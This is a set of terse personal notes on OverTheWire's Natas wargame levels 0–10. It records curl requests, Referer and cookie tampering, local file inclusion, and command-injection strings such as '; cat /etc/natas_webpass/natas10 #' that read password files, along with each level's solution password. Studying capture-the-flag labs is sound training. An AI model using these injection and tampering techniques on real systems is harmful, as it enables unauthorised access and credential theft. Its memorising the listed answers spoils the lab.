- https://www.wechall.net/10-levels-on-Natas.html

---

```md
level-0
- ctrl u 
- ctrl shift i
- [ scfWG6qNEIdzqVyfRwEGXyNUfFZkZeQ7 ]
```

```md
level-0-1
- [ curl -u natas0:natas0 link ] , ( curl -usr usr:passw )
- [ vsDOxoXyq3wckCP1ZmTZ71ngIA606odB ]
```

```md
level-1-2
- curl -u usr:passw link
- [ wget --user=natas2 --password='password' http://natas2.natas.labs.overthewire.org/files/pixel.png ]
- [ curl -u natas2:vsDOxoXyq3wckCP1ZmTZ71ngIA606odB http://natas2.natas.labs.overthewire.org/files/pixel.png -o pixel.png ]
- there is a file directory,
- [ curl -u usr:passw link/files/ ]
- a new file?
- [ K30JrSRHzjxq3paUQuwozY4MNvmNFyhI ]
```

```md
level-2-3
- not even google will find it, meaning bots, how do we check if bots of google can find it? 
- curl -u user:pass link/robots.txt
- user-agent: * , this disallow rule applies to all agents, to not go in that folder
- [ curl -u usr:pass link/that_path/ ] and read
- [ JDrPnuZAKyl6MkiqQGFIddrqpvgOASth ]
```

```md
level-3-4
- should come from natas5, meaning the http, header should be natas5
- [ curl -u usr:pass link -H 'Referer: newlink' ]
- [ e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M ]
```

```md
level-4-5
- curl -i , curl -I
- see the headers, notice cookie: loggedin=0
- need to send a cookie with loggedin=1
- [ curl -i -u natas5:e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M -b 'loggedin=1' http://natas5.natas.labs.overthewire.org/ ], ( -b send cookie with HTTP request)
- [ 7mhjtShJAcld2NYbKHEadnhEwRn2P8VT ]
```

```md
level-5-6
- view sourcecode, include another html in here, go to that html
- [ B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0 ]
```

```md
level-6-7
- local file inclusion (LFT)
- [ curl -u usr:pass link/index.php?page=home ] ( change home to the indicated path )
- [ ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc ]
```

```md
level-7-8
- [ echo "3d3d516343746d4d6d6c315669563362" | xxd -r -p | rev | base64 -d ]
- [ UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9 ]
```

```md
level-8-9
- [ ; cat /etc/natas_webpass/natas10 # ] ( # comments out the latter stuffs) 
- in the command from source code, theres no " " where should be,
- test grep -i ; echo "hello" dictionary.txt
- ; stops the command and runs the next command, as theres no string, the command runs as command, instead of 
literal strings  
- [ EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv ]
```

```md
level-9-10
- any other replacements of ; ?
- [ -n -e . /etc/natas_webpass/natas11 # ] ( -n asks to show line number where it was found, -e . )
- [ -e . /etc/natas_webpass/natas11 # ] ( -e . is basically grep something )
- [ .* /etc/natas_webpass/natas11 # ]
- [ VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd ]
```

```md
level-10-11
- [ php -a ], [ echo urldecode("some%thing") ], [ echo base64_decode("") ] 
```





